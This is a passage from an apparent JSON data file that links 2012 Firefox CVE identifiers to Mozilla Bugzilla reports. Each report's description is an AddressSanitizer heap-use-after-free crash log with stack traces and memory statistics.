firefox/src/layout/generic/nsBlockReflowState.cpp:608 #18 0x7f3bd8abf61b in nsBlockReflowState::AddFloat(nsLineLayout*, nsIFrame*, int) firefox/src/layout/generic/nsBlockReflowState.cpp:503 #19 0x7f3bd8dbc403 in nsLineLayout::AddFloat(nsIFrame*, int) firefox/src/layout/generic/nsLineLayout.h:195 #20 0x7f3bd8db530b in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) firefox/src/layout/generic/nsLineLayout.cpp:868 #21 0x7f3bd8a6fe3f in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) firefox/src/layout/generic/nsBlockFrame.cpp:3834 #22 0x7f3bd8a6989a in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) firefox/src/layout/generic/nsBlockFrame.cpp:3630 ==22134== ABORTING Stats: 150M malloced (164M for red zones) by 352192 calls Stats: 41M realloced by 18995 calls Stats: 110M freed by 224892 calls Stats: 0M really freed by 0 calls Stats: 344M (88113 full pages) mmaped in 86 calls mmaps by size class: 8:278511; 9:49146; 10:20475; 11:18423; 12:3072; 13:2048; 14:1536; 15:384; 16:576; 17:128; 18:176; 19:40; 20:16; mallocs by size class: 8:265920; 9:46521; 10:16109; 11:16839; 12:2376; 13:1812; 14:1414; 15:336; 16:532; 17:113; 18:167; 19:40; 20:13; frees by size class: 8:158005; 9:35984; 10:12721; 11:13639; 12:1450; 13:917; 14:1225; 15:282; 16:464; 17:99; 18:58; 19:38; 20:10; rfrees by size class: Stats: malloc large: 333 small slow: 1835 Shadow byte and word: 0x1fe7764caa91: fd 0x1fe7764caa90: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe7764caa70: fa fa fa fa fa fa fa fa 0x1fe7764caa78: fa fa fa fa fa fa fa fa 0x1fe7764caa80: fa fa fa fa fa fa fa fa 0x1fe7764caa88: fa fa fa fa fa fa fa fa =>0x1fe7764caa90: fd fd fd fd fd fd fd fd 0x1fe7764caa98: fd fd fd fd fd fd fd fd 0x1fe7764caaa0: fd fd fd fd fd fd fd fd 0x1fe7764caaa8: fd fd fd fd fd fd fd fd 0x1fe7764caab0: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-1975": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=777578",
        "title": "Heap-use-after-free in PresShell::CompleteMove",
        "description": "Reproduces on trunk ================================================================= ==11961== ERROR: AddressSanitizer heap-use-after-free on address 0x7f13daaa3bac at pc 0x7f14059ca41d bp 0x7fffba074190 sp 0x7fffba074188 READ of size 4 at 0x7f13daaa3bac thread T0 #0 0x7f14059ca41d in nsINode::GetBoolFlag(nsINode::BooleanFlag) const src/../../dist/include/nsINode.h:1315 #1 0x7f14059ca188 in nsINode::IsInDoc() const src/../../dist/include/nsINode.h:449 #2 0x7f14059bc9fe in nsIContent::GetPrimaryFrame() const src/../../dist/include/nsIContent.h:821 #3 0x7f14061b2266 in PresShell::CompleteMove(bool, bool) src/layout/base/nsPresShell.cpp:2203 #4 0x7f14061b2e4d in non-virtual thunk to PresShell::CompleteMove(bool, bool) asn1cmn.c:0 #5 0x7f14068c696d in mozilla::Selection::Modify(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&) src/layout/generic/nsSelection.cpp:5528 #6 0x7f14113844ca in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 #7 0x7f140c9906eb in CallMethodHelper::Call() src/js/xpconnect/src/XPCWrappedNative.cpp:2416 #8 0x7f140c9f7a74 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1474 #9 0x7f1417f21cc7 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:382 #10 0x7f1417e959a1 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2424 #11 0x7f1417e15ae5 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:302 #12 0x7f1417f2eac6 in js::ExecuteKernel(JSContext*, JSScript*, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:488 #13 0x7f1417f307c0 in js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:525 #14 0x7f14176e97ec in EvaluateUCScriptForPrincipalsCommon(JSContext*, JSObject*, JSPrincipals*, JSPrincipals*, unsigned short const*, unsigned int, char const*, unsigned int, JS::Value*, JSVersion) src/js/src/jsapi.cpp:5439 #15 0x7f14176eb6ac in JS_EvaluateUCScriptForPrincipalsVersionOrigin src/js/src/jsapi.cpp:5476 #16 0x7f1409b568ff in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1487 #17 0x7f1409d0a81e in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9542 #18 0x7f1409cc0e52 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9803 #19 0x7f1409d08a2b in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10071 #20 0x7f14112c0f92 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:474 #21 0x7f14112c2bcc in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:558 #22 0x7f14112851fd in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:625 #23 0x7f1410f13fad in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #24 0x7f140feae88b in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:117 #25 0x7f141153749a in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:209 #26 0x7f14115372e3 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:202 #27 0x7f14115371c8 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:176 #28 0x7f140f3b407e in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:165 #29 0x7f140e003158 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:271 #30 0x7f140474fae0 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3798 #31 0x7f1404756482 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3875 #32 0x7f1404759952 in XRE_main src/toolkit/xre/nsAppRunner.cpp:3951 #33 0x40c28f in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #34 0x409cbd in main src/browser/app/nsBrowserApp.cpp:312 #35 0x7f1421421c4d in ?? ??:0 0x7f13daaa3bac is located 44 bytes inside of 128-byte region [0x7f13daaa3b80,0x7f13daaa3c00) freed by thread T0 here: #0 0x4a4392 in free ??:0 #1 0x7f141e2ad5c3 in moz_free src/memory/mozalloc/mozalloc.cpp:49 #2 0x7f1408b98586 in ~nsHTMLBodyElement src/content/html/content/src/nsHTMLBodyElement.cpp:279 #3 0x7f1407d79ffd in nsNodeUtils::LastRelease(nsINode*) src/content/base/src/nsNodeUtils.cpp:252 #4 0x7f1407c50acf in nsGenericElement::Release() src/content/base/src/nsGenericElement.cpp:3509 #5 0x7f1408b98c94 in nsHTMLBodyElement::Release() src/content/html/content/src/nsHTMLBodyElement.cpp:283 #6 0x7f140c8482a9 in _ZL17DoDeferredReleaseIP11nsISupportsEvR8nsTArrayIT_24nsTArrayDefaultAllocatorE src/js/xpconnect/src/XPCJSRuntime.cpp:563 #7 0x7f140c847ac9 in XPCJSRuntime::GCCallback(JSRuntime*, JSGCStatus) src/js/xpconnect/src/XPCJSRuntime.cpp:598 #8 0x7f1417c42e07 in Collect(JSRuntime*, bool, long, js::JSGCInvocationKind, js::gcreason::Reason) src/js/src/jsgc.cpp:4016 #9 0x7f1417c38e35 in js::GCSlice(JSRuntime*, js::JSGCInvocationKind, js::gcreason::Reason) src/js/src/jsgc.cpp:4044 #10 0x7f1417b940db in js::IncrementalGC(JSRuntime*, js::gcreason::Reason) src/js/src/jsfriendapi.cpp:168 #11 0x7f1409b3dca3 in nsJSContext::GarbageCollectNow(js::gcreason::Reason, nsJSContext::IsIncremental, nsJSContext::IsCompartment, nsJSContext::IsShrinking) src/dom/base/nsJSEnvironment.cpp:2918 #12 0x7f1409b8305e in GCTimerFired(nsITimer*, void*) src/dom/base/nsJSEnvironment.cpp:3214 #13 0x7f14112c0f92 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:474 #14 0x7f14112c2bcc in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:558 #15 0x7f14112851fd in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:625 #16 0x7f1410f13fad in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #17 0x7f140feae88b in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:117 #18 0x7f141153749a in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:209 #19 0x7f14115372e3 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:202 #20 0x7f14115371c8 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:176 #21 0x7f140f3b407e in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:165 #22 0x7f140e003158 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:271 #23 0x7f140474fae0 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3798 #24 0x7f1404756482 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3875 #25 0x7f1404759952 in XRE_main src/toolkit/xre/nsAppRunner.cpp:3951 #26 0x40c28f in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #27 0x409cbd in main src/browser/app/nsBrowserApp.cpp:312 #28 0x7f1421421c4d in ?? ??:0 previously allocated by thread T0 here: #0 0x4a4452 in __interceptor_malloc ??:0 #1 0x7f141e2ad717 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 #2 0x7f1408b97b79 in NS_NewHTMLBodyElement(already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/html/content/src/nsHTMLBodyElement.cpp:264 #3 0x7f140932b2ee in CreateHTMLElement(unsigned int, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/html/document/src/nsHTMLContentSink.cpp:497 #4 0x7f140932bbb0 in NS_NewHTMLElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/html/document/src/nsHTMLContentSink.cpp:480 #5 0x7f1407d4b5f8 in NS_NewElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/base/src/nsNameSpaceManager.cpp:201 #6 0x7f1407a2b8bd in nsDocument::CreateElementNS(nsAString_internal const&, nsAString_internal const&, nsIContent**) src/content/base/src/nsDocument.cpp:4410 #7 0x7f140caf1c8c in nsIDOMDocument_CreateElementNS(JSContext*, unsigned int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:3242 #8 0x7f1417f21cc7 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:382 #9 0x7f1417e959a1 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2424 #10 0x7f1417e15ae5 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:302 #11 0x7f1417f220e9 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:356 #12 0x7f141784a890 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #13 0x7f1417f2724d in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:388 #14 0x7f14176f2a49 in JS_CallFunctionValue src/js/src/jsapi.cpp:5569 #15 0x7f1409b63b15 in nsJSContext::CallEventHandler(nsISupports*, JSObject*, JSObject*, nsIArray*, nsIVariant**) src/dom/base/nsJSEnvironment.cpp:1907 #16 0x7f140a309606 in nsJSEventListener::HandleEvent(nsIDOMEvent*) src/dom/src/events/nsJSEventListener.cpp:188 #17 0x7f140878b7b3 in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsIDOMEventTarget*, unsigned int, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:794 #18 0x7f140878cc7a in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:867 #19 0x7f1408928b67 in nsEventListenerManager::HandleEvent(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.h:144 #20 0x7f1408917806 in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned int, bool, nsCxPusher*) src/content/events/src/nsEventDispatcher.cpp:184 #21 0x7f140891536c in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned int, nsDispatchingCallback*, bool, nsCxPusher*) src/content/events/src/nsEventDispatcher.cpp:312 #22 0x7f140891ae80 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<nsIDOMEventTarget>*) src/content/events/src/nsEventDispatcher.cpp:633 #23 0x7f1405fd5dbf in DocumentViewerImpl::LoadComplete(unsigned int) src/layout/base/nsDocumentViewer.cpp:1017 #24 0x7f140da6f3a8 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, unsigned int) src/docshell/base/nsDocShell.cpp:6300 ==11961== ABORTING Stats: 261M malloced (268M for red zones) by 547279 calls Stats: 87M realloced by 38827 calls Stats: 230M freed by 421350 calls Stats: 99M really freed by 214956 calls Stats: 444M (113737 full pages) mmaped in 111 calls mmaps by size class: 8:294894; 9:57337; 10:20475; 11:16376; 12:4096; 13:3584; 14:1536; 15:384; 16:512; 17:128; 18:272; 19:112; 20:40; mallocs by size class: 8:425683; 9:65265; 10:24573; 11:20475; 12:3931; 13:3838; 14:1797; 15:448; 16:637; 17:146; 18:323; 19:118; 20:45; frees by size class: 8:315274; 9:56823; 10:21534; 11:17730; 12:3193; 13:3642; 14:1616; 15:395; 16:575; 17:120; 18:298; 19:109; 20:41; rfrees by size class: 8:164321; 9:27420; 10:9917; 11:10072; 12:968; 13:626; 14:933; 15:164; 16:340; 17:69; 18:56; 19:47; 20:23; Stats: malloc large: 632 small slow: 2649 Shadow byte and word: 0x1fe27b554775: fd 0x1fe27b554770: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe27b554750: fd fd fd fd fd fd fd fd 0x1fe27b554758: fd fd fd fd fd fd fd fd 0x1fe27b554760: fa fa fa fa fa fa fa fa 0x1fe27b554768: fa fa fa fa fa fa fa fa =>0x1fe27b554770: fd fd fd fd fd fd fd fd 0x1fe27b554778: fd fd fd fd fd fd fd fd 0x1fe27b554780: fa fa fa fa fa fa fa fa 0x1fe27b554788: fa fa fa fa fa fa fa fa 0x1fe27b554790: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-1976": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=776213",
        "title": "Heap-use-after-free in nsHTMLSelectElement::SubmitNamesValues",
        "description": "Reproduces on trunk. Repro reproduced once (but got it under a fully symbolized build). As i have a better testcase, I will add it here. ================================================================= ==2410== ERROR: AddressSanitizer heap-use-after-free on address 0x7f19a99a1280 at pc 0x7f19d6751fef bp 0x7fff085f3390 sp 0x7fff085f3388 READ of size 8 at 0x7f19a99a1280 thread T0 #0 0x7f19d6751fef in nsHTMLSelectElement::SubmitNamesValues(nsFormSubmission*) src/content/html/content/src/nsHTMLSelectElement.cpp:1747 #1 0x7f19d6752c9f in non-virtual thunk to nsHTMLSelectElement::SubmitNamesValues(nsFormSubmission*) asn1cmn.c:0 #2 0x7f19d635feb2 in nsHTMLFormElement::WalkFormElements(nsFormSubmission*) src/content/html/content/src/nsHTMLFormElement.cpp:983 #3 0x7f19d635be9a in nsHTMLFormElement::BuildSubmission(nsFormSubmission**, nsEvent*) src/content/html/content/src/nsHTMLFormElement.cpp:772 #4 0x7f19d635ab79 in nsHTMLFormElement::DoSubmit(nsEvent*) src/content/html/content/src/nsHTMLFormElement.cpp:706 #5 0x7f19d6353d19 in nsHTMLFormElement::DoSubmitOrReset(nsEvent*, int) src/content/html/content/src/nsHTMLFormElement.cpp:657 #6 0x7f19d635360b in nsHTMLFormElement::Submit() src/content/html/content/src/nsHTMLFormElement.cpp:391 #7 0x7f19d635400c in non-virtual thunk to nsHTMLFormElement::Submit() asn1cmn.c:0 #8 0x7f19da2aa1b1 in nsIDOMHTMLFormElement_Submit(JSContext*, unsigned int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:14382 #9 0x7f19e5566587 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:382 #10 0x7f19e54dd593 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2426 #11 0x7f19e5464725 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:302 #12 0x7f19e55669a9 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:356 #13 0x7f19e4e9c430 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #14 0x7f19e556bb0d in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:388 #15 0x7f19e4d470d9 in JS_CallFunctionValue src/js/src/jsapi.cpp:5572 #16 0x7f19d7225bf5 in nsJSContext::CallEventHandler(nsISupports*, JSObject*, JSObject*, nsIArray*, nsIVariant**) src/dom/base/nsJSEnvironment.cpp:1891 #17 0x7f19d79c6ca6 in nsJSEventListener::HandleEvent(nsIDOMEvent*) src/dom/src/events/nsJSEventListener.cpp:188 #18 0x7f19d5e24bb3 in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsIDOMEventTarget*, unsigned int, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:794 #19 0x7f19d5e2607a in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:867 #20 0x7f19d5fd4c97 in nsEventListenerManager::HandleEvent(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.h:144 #21 0x7f19d5fc3936 in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned int, bool, nsCxPusher*) src/content/events/src/nsEventDispatcher.cpp:185 #22 0x7f19d5fc149c in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned int, nsDispatchingCallback*, bool, nsCxPusher*) src/content/events/src/nsEventDispatcher.cpp:313 #23 0x7f19d5fc6fb0 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<nsIDOMEventTarget>*) src/content/events/src/nsEventDispatcher.cpp:634 #24 0x7f19d367419f in DocumentViewerImpl::LoadComplete(unsigned int) src/layout/base/nsDocumentViewer.cpp:1017 #25 0x7f19db0e5dd8 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, unsigned int) src/docshell/base/nsDocShell.cpp:6294 #26 0x7f19db0ddae1 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, unsigned int) src/docshell/base/nsDocShell.cpp:6125 #27 0x7f19db0decd5 in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, unsigned int) asn1cmn.c:0 #28 0x7f19db1e4fd4 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, unsigned int) src/uriloader/base/nsDocLoader.cpp:1352 #29 0x7f19db1e29e5 in nsDocLoader::doStopDocumentLoad(nsIRequest*, unsigned int) src/uriloader/base/nsDocLoader.cpp:930 #30 0x7f19db1dbc38 in nsDocLoader::DocLoaderIsEmpty(bool) src/uriloader/base/nsDocLoader.cpp:822 #31 0x7f19db1e01bc in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) src/uriloader/base/nsDocLoader.cpp:704 #32 0x7f19db1e1d0d in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) asn1cmn.c:0 #33 0x7f19d2042e89 in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, unsigned int) src/netwerk/base/src/nsLoadGroup.cpp:698 #34 0x7f19d510bd94 in nsDocument::DoUnblockOnload() src/content/base/src/nsDocument.cpp:7189 #35 0x7f19d510b821 in nsDocument::UnblockOnload(bool) src/content/base/src/nsDocument.cpp:7132 #36 0x7f19d701ed84 in nsBindingManager::DoProcessAttachedQueue() src/content/xbl/src/nsBindingManager.cpp:990 #37 0x7f19d70390f9 in nsRunnableMethodImpl<void (nsBindingManager::*)(), true>::Run() src/../../../dist/include/nsThreadUtils.h:349 #38 0x7f19de8eb8fd in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:625 #39 0x7f19de57a6ad in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #40 0x7f19dd519ce6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #41 0x7f19deb9db9a in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:209 #42 0x7f19deb9d9e3 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:202 #43 0x7f19deb9d8c8 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:176 #44 0x7f19dca23c8e in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:165 #45 0x7f19db676eb8 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:257 #46 0x7f19d1e04d20 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3787 #47 0x7f19d1e0b6c2 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3864 #48 0x7f19d1e0eb92 in XRE_main src/toolkit/xre/nsAppRunner.cpp:3940 #49 0x40c28f in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:160 #50 0x409cbd in main src/browser/app/nsBrowserApp.cpp:298 #51 0x7f19ee9c3c4d in ?? ??:0 0x7f19a99a1280 is located 0 bytes inside of 232-byte region [0x7f19a99a1280,0x7f19a99a1368) freed by thread T0 here: #0 0x4a4392 in free ??:0 #1 0x7f19eb84f5c3 in moz_free src/memory/mozalloc/mozalloc.cpp:49 #2 0x7f19d6720436 in ~nsHTMLSelectElement src/content/html/content/src/nsHTMLSelectElement.cpp:134 #3 0x7f19d541237d in nsNodeUtils::LastRelease(nsINode*) src/content/base/src/nsNodeUtils.cpp:252 #4 0x7f19d52e8e4f in nsGenericElement::Release() src/content/base/src/nsGenericElement.cpp:3509 #5 0x7f19d6721884 in nsHTMLSelectElement::Release() src/content/html/content/src/nsHTMLSelectElement.cpp:146 #6 0x7f19de57d1db in nsXPCOMCycleCollectionParticipant::UnrootImpl(void*) src/objdir-ff-asan-sym/xpcom/build/nsCycleCollectionParticipant.cpp:37 #7 0x7f19de9a21ec in nsCycleCollector::CollectWhite(nsICycleCollectorListener*) src/xpcom/base/nsCycleCollector.cpp:2305 #8 0x7f19de9a9ef6 in nsCycleCollector::FinishCollection(nsICycleCollectorListener*) src/xpcom/base/nsCycleCollector.cpp:2845 #9 0x7f19de9af388 in nsCycleCollectorRunner::Collect(bool, nsCycleCollectorResults*, nsICycleCollectorListener*) src/xpcom/base/nsCycleCollector.cpp:3147 #10 0x7f19de9ae095 in nsCycleCollector_collect(bool, nsCycleCollectorResults*, nsICycleCollectorListener*) src/xpcom/base/nsCycleCollector.cpp:3236 #11 0x7f19d72017f5 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int, bool) src/dom/base/nsJSEnvironment.cpp:3072 #12 0x7f19d72463f2 in CCTimerFired(nsITimer*, void*) src/dom/base/nsJSEnvironment.cpp:3263 #13 0x7f19de927692 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:474 #14 0x7f19de9292cc in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:558 #15 0x7f19de8eb8fd in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:625 #16 0x7f19de57a6ad in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #17 0x7f19db58e826 in nsXULWindow::ShowModal() src/xpfe/appshell/src/nsXULWindow.cpp:378 #18 0x7f19db571732 in nsContentTreeOwner::ShowAsModal() src/xpfe/appshell/src/nsContentTreeOwner.cpp:529 #19 0x7f19db5718ac in non-virtual thunk to nsContentTreeOwner::ShowAsModal() asn1cmn.c:0 #20 0x7f19db39a4eb in nsWindowWatcher::OpenWindowJSInternal(nsIDOMWindow*, char const*, char const*, char const*, bool, nsIArray*, bool, nsIDOMWindow**) src/embedding/components/windowwatcher/src/nsWindowWatcher.cpp:996 #21 0x7f19db390b71 in nsWindowWatcher::OpenWindow(nsIDOMWindow*, char const*, char const*, char const*, nsISupports*, nsIDOMWindow**) src/embedding/components/windowwatcher/src/nsWindowWatcher.cpp:381 #22 0x7f19dc80e8b1 in nsNSSDialogHelper::openDialog(nsIDOMWindow*, char const*, nsISupports*, bool) src/security/manager/pki/src/nsNSSDialogHelper.cpp:44 #23 0x7f19dc7f391b in nsNSSDialogs::DisplayGeneratingKeypairInfo(nsIInterfaceRequestor*, nsIKeygenThread*) src/security/manager/pki/src/nsNSSDialogs.cpp:457 #24 0x7f19dc7f3af7 in non-virtual thunk to nsNSSDialogs::DisplayGeneratingKeypairInfo(nsIInterfaceRequestor*, nsIKeygenThread*) asn1cmn.c:0 #25 0x7f19dba35f05 in nsKeygenFormProcessor::GetPublicKey(nsAString_internal&, nsAString_internal&, nsString&, nsAString_internal&, nsAString_internal&) src/security/manager/ssl/src/nsKeygenHandler.cpp:658 #26 0x7f19dba3a053 in nsKeygenFormProcessor::ProcessValue(nsIDOMHTMLElement*, nsAString_internal const&, nsAString_internal&) src/security/manager/ssl/src/nsKeygenHandler.cpp:800 #27 0x7f19d675196e in nsHTMLSelectElement::SubmitNamesValues(nsFormSubmission*) src/content/html/content/src/nsHTMLSelectElement.cpp:1771 #28 0x7f19d6752c9f in non-virtual thunk to nsHTMLSelectElement::SubmitNamesValues(nsFormSubmission*) asn1cmn.c:0 #29 0x7f19d635feb2 in nsHTMLFormElement::WalkFormElements(nsFormSubmission*) src/content/html/content/src/nsHTMLFormElement.cpp:983 previously allocated by thread T0 here: #0 0x4a4452 in __interceptor_malloc ??:0 #1 0x7f19eb84f717 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 #2 0x7f19d671ecd9 in NS_NewHTMLSelectElement(already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/html/content/src/nsHTMLSelectElement.cpp:104 #3 0x7f19d69f70ce in CreateHTMLElement(unsigned int, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/html/document/src/nsHTMLContentSink.cpp:497 #4 0x7f19d69f7990 in NS_NewHTMLElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/html/document/src/nsHTMLContentSink.cpp:480 #5 0x7f19d53e3978 in NS_NewElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/base/src/nsNameSpaceManager.cpp:201 #6 0x7f19d84a2b55 in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) src/parser/html/nsHtml5TreeOperation.cpp:340 #7 0x7f19d84c3806 in nsHtml5TreeOpExecutor::RunFlushLoop() src/parser/html/nsHtml5TreeOpExecutor.cpp:566 #8 0x7f19d84ff746 in nsHtml5ExecutorFlusher::Run() src/parser/html/nsHtml5StreamParser.cpp:127 #9 0x7f19de8eb8fd in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:625 #10 